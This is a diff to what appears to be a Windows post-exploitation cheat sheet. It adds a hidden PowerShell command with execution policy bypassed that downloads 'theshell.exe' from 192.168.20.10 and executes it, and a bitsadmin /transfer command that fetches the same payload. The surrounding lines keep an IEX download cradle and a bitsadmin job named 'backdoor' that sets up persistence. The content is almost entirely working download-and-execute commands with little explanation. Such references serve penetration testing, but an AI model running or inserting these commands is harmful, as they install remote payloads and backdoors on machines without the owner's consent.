@@ -34,7 +34,9 @@ Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html
 
 
 ### Powershell Downloader
- * **Command with arguments**: `powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))"`
+ * **Command with arguments**:
+ - `powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))"`
+ - `powershell.exe -w hidden -nop -ep bypass -c "(new-object net.webclient).downloadfile('http://192.168.20.10/theshell.exe', 'C:\Windows\temp\theshell.exe');(net-object -com shell.application).shellexecute('C:\Windows\temp\theshell.exe')"`
  * **Description**: According to [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), _"Schedule this and it will execute the shellcode on that page, pulling it each time (so you can change as needed)"_.
 
 ### bitsadmin Download/Exec
@@ -44,6 +46,12 @@ bitsadmin /create backdoor
 bitsadmin /addfile backdoor http://192.168.20.10/theshell.exe C:\windows\temp\theshell.exe
 bitsadmin /SETMINRETRYDELAY 88000
 bitsadmin /SETNOTIFYCMDLINE backdoor C:\windows\temp\theshell.exe NULL
+```
+
+or download the file in another way:
+
+```
+bitsadmin /transfer backdoor /download /priority high http://192.168.20.10/theshell.exe %TEMP%\test.exe
 ```
 
 Check the backdoor is set up correctly:
